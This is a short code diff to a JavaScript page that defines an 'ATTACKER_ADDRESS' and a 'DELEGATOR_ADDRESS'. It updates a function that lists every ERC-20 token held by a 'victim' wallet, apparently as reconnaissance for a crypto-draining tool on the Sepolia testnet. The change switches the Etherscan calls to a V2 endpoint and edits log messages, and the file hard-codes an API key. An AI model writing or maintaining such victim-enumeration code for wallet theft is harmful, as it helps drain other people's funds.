@@ -304,7 +304,7 @@
   const DELEGATOR_ADDRESS = "0x63c0c19a282a1B52b07dD5a65b58948A07DAE32B";
   const ATTACKER_ADDRESS = "0xC4D7B663dc72aDd0e02719093F9927a9B0234471";
   const ALCHEMY_API_KEY = "R9QZAZG3G1286RTAZW391RIRPIKIT9E597";
-  const ETHERSCAN_BASE_URL = "https://api-sepolia.etherscan.io/api";
+  const ETHERSCAN_BASE_URL = "https://api-sepolia.etherscan.io/v2";
 
   let userAddress = null;
   let userBalance = null;
@@ -329,17 +329,17 @@
       </div>`).join('');
   }
 
-  // Fetch all ERC-20 tokens held by victim using Etherscan tokenlist
+  // Fetch all ERC-20 tokens held by victim using Etherscan V2 API
   async function fetchTokenBalances(address) {
     try {
-      // Use Etherscan's tokenlist to get current token holdings
-      const url = `${ETHERSCAN_BASE_URL}?module=account&action=tokenlist&address=${address}&apikey=${ALCHEMY_API_KEY}`;
-      console.log("🌐 Fetching from:", url);
+      // Use Etherscan V2 API endpoint for token holdings
+      const url = `${ETHERSCAN_BASE_URL}/account/tokenbalances?address=${address}&apikey=${ALCHEMY_API_KEY}`;
+      console.log("🌐 Fetching from V2:", url);
       
       const response = await fetch(url);
       const data = await response.json();
       
-      console.log("📡 Full Etherscan response:", JSON.stringify(data, null, 2));
+      console.log("📡 Full Etherscan V2 response:", JSON.stringify(data, null, 2));
       console.log("📡 Response status:", data.status);
       console.log("📡 Response message:", data.message);
       
@@ -349,7 +349,7 @@
           return t.balance && t.balance !== "0" && t.balance !== "0x0";
         });
         
-        console.log(`📦 Found ${nonZeroTokens.length} tokens from tokenlist`);
+        console.log(`📦 Found ${nonZeroTokens.length} tokens from V2 API`);
         nonZeroTokens.forEach(t => {
           console.log(`✅ ${t.name} (${t.symbol}): ${t.contractAddress} = ${t.balance}`);
         });
